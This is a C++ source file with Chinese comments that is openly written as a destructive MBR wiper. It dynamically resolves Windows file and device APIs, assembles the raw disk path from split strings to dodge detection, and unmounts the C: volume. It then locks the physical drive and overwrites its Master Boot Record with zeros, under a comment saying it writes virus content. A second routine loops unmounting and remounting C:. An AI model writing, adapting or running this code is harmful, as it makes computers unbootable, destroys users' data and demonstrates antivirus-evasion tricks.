
// ms.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include<windows.h>
#include <format>
using namespace std;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };

    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef
VOID
(NTAPI* PIO_APC_ROUTINE) (
    _In_ PVOID ApcContext,
    _In_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Reserved
    );
typedef BOOL(WINAPI* pDeviceIoControl)
(
    _In_ HANDLE hDevice,
    _In_ DWORD dwIoControlCode,
    _In_reads_bytes_opt_(nInBufferSize) LPVOID lpInBuffer,
    _In_ DWORD nInBufferSize,
    _Out_writes_bytes_to_opt_(nOutBufferSize, *lpBytesReturned) LPVOID lpOutBuffer,
    _In_ DWORD nOutBufferSize,
    _Out_opt_ LPDWORD lpBytesReturned,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef HANDLE(WINAPI* pCreateFileA)(
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
    );
typedef BOOL (WINAPI* pwritefile)(
    _In_ HANDLE hFile,
    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToWrite,
    _Out_opt_ LPDWORD lpNumberOfBytesWritten,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef NTSTATUS
(NTAPI* dd)
(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_reads_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key
);
int mdin1() {
   // LI_FN(CreateFileA)("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE,
       // FILE_SHARE_READ | FILE_SHARE_WRITE,
      //  NULL,
       // OPEN_EXISTING,
       // 0,
        //NULL);
}
int main()
{
  
    pCreateFileA MyCreateFileA = (pCreateFileA)GetProcAddress(LoadLibrary("KERNEL32.dll"), "CreateFileA");
    pwritefile MyWritefile = (pwritefile)GetProcAddress(LoadLibrary("KERNEL32.dll"), "WriteFile");
    pDeviceIoControl MyDeviceIoControl= (pDeviceIoControl)GetProcAddress(LoadLibrary("KERNEL32.dll"), "DeviceIoControl");
    HANDLE hDevice;
    DWORD dwBytesWritten, dwBytesReturned;
    BYTE pMBR[512] = { 0 };
    char str1[] = {"\\\\"};
     char str2[] = { ".\\" };
    char str3[] = { "PHYSICA" };
     char str4[] = { "LDRIVE0" };
     auto a = std::format("{}{}{}{}",str1,str2,str3,str4);
     CHAR szUniqueVolumeName[MAX_PATH] = { 0 };
     GetVolumeNameForVolumeMountPoint("C:\\", szUniqueVolumeName, MAX_PATH);

     BOOL bSuccess = DeleteVolumeMountPoint("C:\\");
   
    hDevice = MyCreateFileA
    (
        a.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    MyDeviceIoControl
    (
        hDevice,
        FSCTL_LOCK_VOLUME,
        NULL,
        0,
        NULL,
        0,
        &dwBytesReturned,
        NULL
    );
    // 写入病毒内容
    MyWritefile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
    MyDeviceIoControl
    (
        hDevice,
        FSCTL_UNLOCK_VOLUME,
        NULL,
        0,
        NULL,
        0,
        &dwBytesReturned,
        NULL
    );

}
int main5() {
    while (true)
    {
      
        CHAR szUniqueVolumeName[MAX_PATH] = { 0 };
        GetVolumeNameForVolumeMountPoint("C:\\", szUniqueVolumeName, MAX_PATH);

        BOOL bSuccess = DeleteVolumeMountPoint("C:\\");
        bSuccess = SetVolumeMountPoint("C:\\", szUniqueVolumeName);
    }
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
